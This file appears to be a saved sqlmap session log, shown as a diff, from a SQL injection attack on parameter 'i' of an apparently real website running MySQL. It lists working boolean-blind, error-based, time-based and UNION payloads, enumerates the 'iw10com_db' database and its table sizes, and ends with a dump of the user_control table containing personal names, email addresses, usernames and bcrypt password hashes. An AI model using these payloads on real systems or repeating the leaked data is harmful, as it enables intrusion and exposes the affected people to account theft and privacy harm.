@@ -1,0 +1,139 @@
+sqlmap identified the following injection point(s) with a total of 57 HTTP(s) requests:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: i=(SELECT (CASE WHEN (6977=6977) THEN 9 ELSE (SELECT 1081 UNION SELECT 8613) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: i=9 AND (SELECT 7999 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(7999=7999,1))),0x7178627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: i=9 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: i=-7710 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176716b71,0x535050546b504d766769517956476a45496e7747617a6549734f5a715147796f446d7369486e4d63,0x7178627671)-- RXgw
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] iw10com_db
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: i=(SELECT (CASE WHEN (6977=6977) THEN 9 ELSE (SELECT 1081 UNION SELECT 8613) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: i=9 AND (SELECT 7999 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(7999=7999,1))),0x7178627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: i=9 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: i=-7710 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176716b71,0x535050546b504d766769517956476a45496e7747617a6549734f5a715147796f446d7369486e4d63,0x7178627671)-- RXgw
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: iw10com_db
+[20 tables]
++------------------+
+| language         |
+| antena           |
+| antena_planos    |
+| blog             |
+| canais           |
+| canais_categoria |
+| canais_pacotes   |
+| categoria        |
+| cidades          |
+| content          |
+| empresa          |
+| pacotes          |
+| publicidade      |
+| radio            |
+| radio_pacotes    |
+| regioes          |
+| servicos         |
+| tbBuy            |
+| tipos            |
+| user_control     |
++------------------+
+
+Database: iw10com_db
++------------------+---------+
+| Table            | Entries |
++------------------+---------+
+| cidades          | 5564    |
+| canais_pacotes   | 998     |
+| radio_pacotes    | 221     |
+| canais           | 167     |
+| regioes          | 27      |
+| canais_categoria | 23      |
+| radio            | 20      |
+| `language`       | 13      |
+| pacotes          | 11      |
+| blog             | 10      |
+| servicos         | 7       |
+| tipos            | 5       |
+| content          | 3       |
+| antena_planos    | 2       |
+| categoria        | 2       |
+| publicidade      | 2       |
+| user_control     | 2       |
+| antena           | 1       |
+| empresa          | 1       |
++------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: i=(SELECT (CASE WHEN (6977=6977) THEN 9 ELSE (SELECT 1081 UNION SELECT 8613) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: i=9 AND (SELECT 7999 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(7999=7999,1))),0x7178627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: i=9 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: i=-7710 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176716b71,0x535050546b504d766769517956476a45496e7747617a6549734f5a715147796f446d7369486e4d63,0x7178627671)-- RXgw
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: iw10com_db
+Table: user_control
+[2 entries]
++-----+-----------+------+--------+---------------------+-------+-------------------------+--------+--------------------------------------------------------------+--------------------------------------------------------------+------------+-----------------+
+| id  | nt_pedido | tipo | nome   | data                | nivel | email                   | user   | license                                                      | password                                                     | nt_estoque | nt_estoque_hora |
++-----+-----------+------+--------+---------------------+-------+-------------------------+--------+--------------------------------------------------------------+--------------------------------------------------------------+------------+-----------------+
+| 249 | N         | D    | Mateus | 2015-06-16 16:56:33 | 1     | mateusberwian@gmail.com | mateus | $2a$08$NjExMzMxNTA1NTgwN2Y3MObLzIpQpaNooUpa.HYzevXhOJQ4FcJL. | $2a$08$ODYzMTcwNDA0NTU4MDdmNuleaEYiCc/ChygcAm2wbihugAe8GzbvW | N          | 00:00           |
+| 267 | N         | U    | IW10   | 2017-03-12 21:24:28 | 1     | iw10@iw10.com.br        | iw10   | $2a$08$MTg3ODI2NTYyMTU4YzVlNe4PZJXsl7Kg21OSlW.60i0opa4f.Pusu | $2a$08$MTI0Mjk0MDA5MDU4YzVlNej8p6YivTtakVjy2GOUjCvX2oxIz4ma2 | N          | 00:00           |
++-----+-----------+------+--------+---------------------+-------+-------------------------+--------+--------------------------------------------------------------+--------------------------------------------------------------+------------+-----------------+
+
